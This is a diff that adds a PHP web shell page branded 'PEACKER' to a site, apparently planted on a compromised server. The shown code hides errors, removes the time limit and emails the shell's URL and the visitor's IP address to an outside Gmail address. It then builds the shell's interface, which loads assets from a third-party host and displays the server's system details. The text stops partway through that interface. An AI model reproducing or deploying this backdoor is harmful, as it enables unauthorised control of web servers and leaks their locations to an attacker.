@@ -1,0 +1,48 @@
+<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'peackerganteng@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "ADA PENYUSUP", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
+<!DOCTYPE html>
+	<html dir="auto" lang="en-US">
+
+		<head>
+			<meta charset="UTF-8">
+			<meta name="robots" content="NOINDEX, NOFOLLOW">
+
+				<title>PEACKER</title>
+
+			<link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
+			<link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">
+
+			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
+		</head>
+
+		<body>
+			<header>
+				<div class="y x">
+					<a class="ajx" href="sex.php">
+						Welcome Peacker
+					</a>
+				</div>
+
+				<div class="q x w">
+					&#8212; DIOS &#8212; NO &#8212; CREA &#8212; NADA &#8212; EN &#8212; VANO &#8212;
+				</div>
+				
+			</header>
+
+			<article>
+				<div class="i">
+					<i class="far fa-hdd"></i>
+					Linux nc-ph-1296-52.theloadedbaze.com 3.10.0-1160.81.1.el7.x86_64 #1 SMP Fri Dec 16 17:29:43 UTC 2022 x86_64
+					<br />
+
+					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> Apache <b>PHP :</b> 
